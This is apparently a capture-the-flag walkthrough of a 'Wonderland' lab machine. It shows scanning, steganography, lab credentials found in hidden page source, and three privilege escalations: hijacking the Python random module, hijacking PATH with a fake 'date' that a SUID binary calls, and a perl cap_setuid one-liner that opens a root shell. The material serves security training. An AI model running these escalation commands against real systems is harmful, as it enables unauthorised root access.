Difficult: Medium
------------------------------------------
Note: Fall down the rabbit hole and enter wonderland.
------------------------------------------

+ Scan the all ports and enumurate the directories:

```bash
	nmap -sV -vv -A -T4 -p- <IP>
	22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
	|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
	|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh
	80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-title: Follow the white rabbit.
```

```bash
	gobuster dir http://<IP-Target>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -xtxt,php -t64
	===============================================================
	Gobuster v3.6
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://<IP>/
	[+] Method:                  GET
	[+] Threads:                 64
	[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.6
	[+] Extensions:              txt,php
	[+] Timeout:                 10s
	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	/img                  (Status: 301) [Size: 0] [--> img/]
	/r                    (Status: 301) [Size: 0] [--> r/]
	/poem                 (Status: 301) [Size: 0] [--> poem/]
	/http%3A%2F%2Fwww.php (Status: 301) [Size: 0] [--> /http:/www.php]
	/http%3A%2F%2Fwww.txt (Status: 301) [Size: 0] [--> /http:/www.txt]
	/http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /http:/www]
	/http%3A%2F%2Fyoutube (Status: 301) [Size: 0] [--> /http:/youtube]
	/http%3A%2F%2Fyoutube.txt (Status: 301) [Size: 0] [--> /http:/youtube.txt]
	/http%3A%2F%2Fyoutube.php (Status: 301) [Size: 0] [--> /http:/youtube.php]
	/http%3A%2F%2Fblogs   (Status: 301) [Size: 0] [--> /http:/blogs]
	/http%3A%2F%2Fblogs.txt (Status: 301) [Size: 0] [--> /http:/blogs.txt]
	/http%3A%2F%2Fblogs.php (Status: 301) [Size: 0] [--> /http:/blogs.php]
	/http%3A%2F%2Fblog    (Status: 301) [Size: 0] [--> /http:/blog]
	/http%3A%2F%2Fblog.txt (Status: 301) [Size: 0] [--> /http:/blog.txt]
	/http%3A%2F%2Fblog.php (Status: 301) [Size: 0] [--> /http:/blog.php]
	/**http%3A%2F%2Fwww   (Status: 301) [Size: 0] [--> /%2A%2Ahttp:/www]
	Progress: 661680 / 661683 (100.00%)
	===============================================================
	Finished
	===============================================================
```

+ Download the 3 images in /image.
+ Try to steg each images to find some hidden messages
+ We have the hint in last image "white_rabbit_1.jpg"

```bash
	# steghide extract -sf white_rabbit_1.jpg 
	Enter passphrase: 
	wrote extracted data to "hint.txt".
	# cat hint.txt 
	follow the r a b b i t
``` 
+ We enumurate the <IP>/r and find the hidden directories:

```bash
	gobuster dir -u http://<IP>/r -w /usr/share/wordlists/dirb/common.txt -xtxt -t64
	===============================================================
	Gobuster v3.6
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://<IP>/r
	[+] Method:                  GET
	[+] Threads:                 64
	[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.6
	[+] Extensions:              txt
	[+] Timeout:                 10s
	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	/a                    (Status: 301) [Size: 0] [--> a/]
	/index.html           (Status: 301) [Size: 0] [--> ./]
	Progress: 9228 / 9230 (99.98%)
	===============================================================
	Finished
	===============================================================

```
+ And step by step we continue enumurate /a we get /b after will /b and /i,... so base in the hint.txt "follow the r a b b i t"
=> We know the each characters will be the directories /r /a /b /b /i /t .
+ Access the directories we got the message:
```bash
		"Open the door and enter wonderland
		"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."

		Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"

		"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving the other paw, 
		 "lives a March Hare. Visit either you like: they’re both mad."
```         

+ View the page source:

```
		<!DOCTYPE html>

		<head>
		    <title>Enter wonderland</title>
		    <link rel="stylesheet" type="text/css" href="/main.css">
		</head>

		<body>
		    <h1>Open the door and enter wonderland</h1>
		    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
		    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
		    </p>
		    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
		        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
		    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
		    <img src="/img/alice_door.png" style="height: 50rem;>
		</body>
==> We got the credential "alice:HowDothTheLittleCrocodileImproveHisShiningTail". That is the credential of _ssh
```

+ Login SSH with alice:

```bash
	# ssh alice@<IP>
	alice@<IP>'s password: 
	Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage

	  System information as of Tue Sep 10 15:04:42 UTC 2024

	  System load:  0.0                Processes:           85
	  Usage of /:   18.9% of 19.56GB   Users logged in:     0
	  Memory usage: 32%                IP address for eth0: <IP>
	  Swap usage:   0%


	0 packages can be updated.
	0 updates are security updates.


	Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
	alice@wonderland:~$ id
	uid=1001(alice) gid=1001(alice) groups=1001(alice)

```

=== PRIVILEGE ESCALATION ===
+ First try with 'sudo -l':

```
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```  

-> We can run python3 through priv 'rabbit' without 'root'
 - Check the file python "walrus_and_the_carpenter" -> output will print the random the line in poem.
 - Analyze the code, we will know the obj line use "random" module with method 'choice' to "Returns a random element from the given sequence"
 The sequence in here is 'poem'.
 - Idea: We manipulate "random" to get the shell to priv 'rabbit' because "import random".
 - Create the file python "random.py" to get the shell:

 ```
    python3
    import os

    os.system('/bin/bash')     ####Should use /bash instead of /sh to spawn full interactive system shell####
 ``` 
+ Run file python by python with user 'rabbit':

```bash
	alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 
	rabbit@wonderland:~$ id
	uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```
--> Successfull 

+ Now we're in priv 'rabbit'. Go to the next directory is rabbit
+ We found the binary file SUID name "teaParty": '-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty'
+ Run file ./teaParty:

```
 -> Welcome to the tea party!
	The Mad Hatter will be here soon.
	Probably by Thu, 12 Sep 2024 09:35:06 +0000
	Ask very nicely, and I will give you some tea while you wait for him
```

+ See inside the file, we find something interested: 
```   
    "Welcome to the tea party!
	The Mad Hatter will be here soon./bin/echo -n 'Probably by ' && date --date='next hour' -RAsk very nicely, 
 	and I will give you some tea while you wait for himSegmentation fault (core dumped)8" 
```

-> We know the command 'date' display the current date and time and The /bin/echo part specifies the full path to the echo command, which is located in the /bin directory.

 + Idea: We can manipulate 'date' to get the shell from that we can priv maybe base in the output we can figure out use we can priv is 'Hatter'
 + We priv escalation PATH because we could potentially hijack an application to run a script.
 + First echo $PATH and we know file 'teaParty' run 'date' default usr/local/bin.
 + The folder 'date' that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it.

```bash
	rabbit@wonderland:/home/rabbit$ export PATH=/tmp:$PATH
	rabbit@wonderland:/home/rabbit$ echo $PATH
	/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```

+ Go to /tmp and create the /date to spawn the shell:

```bash
	rabbit@wonderland:/tmp$ echo "/bin/bash" > date
	rabbit@wonderland:/tmp$ ls
	date
	systemd-private-120793e5ca52415f8fc37eb3662e100a-systemd-resolved.service-JfjlVt
	systemd-private-120793e5ca52415f8fc37eb3662e100a-systemd-timesyncd.service-lrgWNH
	rabbit@wonderland:/tmp$ chmod 777 date
	rabbit@wonderland:/tmp$ ls -l
	total 12
	-rwxrwxrwx 1 rabbit rabbit   10 Sep 12 09:50 date
	drwx------ 3 root   root   4096 Sep 12 07:50 systemd-private-120793e5ca52415f8fc37eb3662e100a-systemd-resolved.service-JfjlVt
	drwx------ 3 root   root   4096 Sep 12 07:50 systemd-private-120793e5ca52415f8fc37eb3662e100a-systemd-timesyncd.service-lrgWNH
	rabbit@wonderland:/tmp$ cd /home/rabbit/
	rabbit@wonderland:/home/rabbit$ ls
	teaParty
	rabbit@wonderland:/home/rabbit$ ./teaParty 
	Welcome to the tea party!
	The Mad Hatter will be here soon.
	Probably by hatter@wonderland:/home/rabbit$ id
	uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```
-> Now we prived user 'Hatter'

+ Go to /hatter we find the 'password.txt'. That is password ssh of Hatter.
 -"hatter@WhyIsARavenLikeAWritingDesk?"
+ Login again ssh of Hatter
+ After priv through all user that call priv horizontal user1 -> user2. Finally, we can priv vertical to 'root'
+ Now we use the tool call 'linpeas.sh' to scan the vector PE
+ We found it - vector PE: 
	Files with capabilities (limited to 50):
	"/usr/bin/perl5.26.1 = cap_setuid+ep"
	/usr/bin/mtr-packet = cap_net_raw+ep
	"/usr/bin/perl = cap_setuid+ep"
-> That is Capabilities with '/usr/bin/perl'.
+ The reason why we need to priv to user 'Hatter' because /usr/bin/perl can just run under root or hatter.

```
	~$ ls -l /usr/bin/perl
	-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl
```
-> So we only priv to root if we prived to Hatter.

```bash
hatter@wonderland:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
root@wonderland:~# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

END!!!